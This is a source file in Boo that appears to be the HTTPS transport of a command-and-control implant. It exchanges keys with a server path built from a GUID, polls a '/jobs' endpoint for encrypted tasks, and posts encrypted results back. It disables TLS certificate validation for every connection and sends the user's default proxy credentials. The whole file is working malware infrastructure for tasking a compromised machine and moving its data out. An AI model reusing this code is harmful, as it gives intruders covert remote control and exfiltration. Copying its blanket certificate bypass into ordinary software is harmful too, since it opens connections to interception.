class Response:
    private Request as WebRequest

    def constructor(request as WebRequest):
        Request = request

    public Text:
        get:
            response = Request.GetResponse()
            reader = StreamReader(response.GetResponseStream())
            data = reader.ReadToEnd()
            reader.Close()
            response.Close()
            Request.Abort()
            return data

    public Bytes:
        get:
            data = null
            response = Request.GetResponse()
            using memstream = MemoryStream():
                using reader = response.GetResponseStream():
                    reader.CopyTo(memstream)
                    data = memstream.ToArray()
                    reader.Close()
            response.Close()
            Request.Abort()
            return data


class Requests:
    private proxyAware as bool = true
    private verify as bool = false
    private sslVersions = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12

    def constructor():
        ServicePointManager.SecurityProtocol = sslVersions
        ServicePointManager.Expect100Continue = false
        unless verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback({sender, certification, chain, sslPolicyErrors | return true})

    public def Get(url as Uri) as Response:
        r = WebRequest.Create(url)
        #r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "GET"
        if proxyAware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        return Response(r)

    public def Post(url as Uri, payload as (byte)) as Response:
        r = WebRequest.Create(url)
        #r.ServicePoint.ConnectionLimit = 500
        r.Timeout = 30000
        r.ContentType = "application/octet-stream"
        r.Method = "POST"
        if proxyAware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        r.ContentLength = payload.Length
        stream = r.GetRequestStream()
        stream.Write(payload, 0, payload.Length)
        stream.Close()

        return Response(r)

    public def Post(url as Uri, payload as string) as Response:
        return Post(url, Encoding.UTF8.GetBytes(payload))

class Comms:
    public Name as string = "https"
    public BaseUrl as Uri
    public JobsUrl as Uri
    private Requests as Requests = Requests()
    private Crypto as Crypto

    def constructor(guid as string, url as string):
        BaseUrl = Uri(urljoin(url, guid))
        JobsUrl = Uri(urljoin(BaseUrl, '/jobs'))

    public def KeyExchange():
        Crypto = Crypto()
        r = Requests.Post(BaseUrl, Crypto.public_key)
        Crypto.derive_key(r.Text)

    public def SendJobResults(results as string, job_id as string):
        encrypted_results = Crypto.Encrypt(results)
        job_url = Uri(urljoin(JobsUrl, "/$(job_id)"))
        Requests.Post(job_url, encrypted_results)

    public def GetJob() as JsonJob:
        job = Requests.Get(JobsUrl).Bytes
        if len(job):
            decrypted_data = Encoding.UTF8.GetString(Crypto.Decrypt(job))
            return JavaScriptSerializer().Deserialize[of JsonJob](decrypted_data)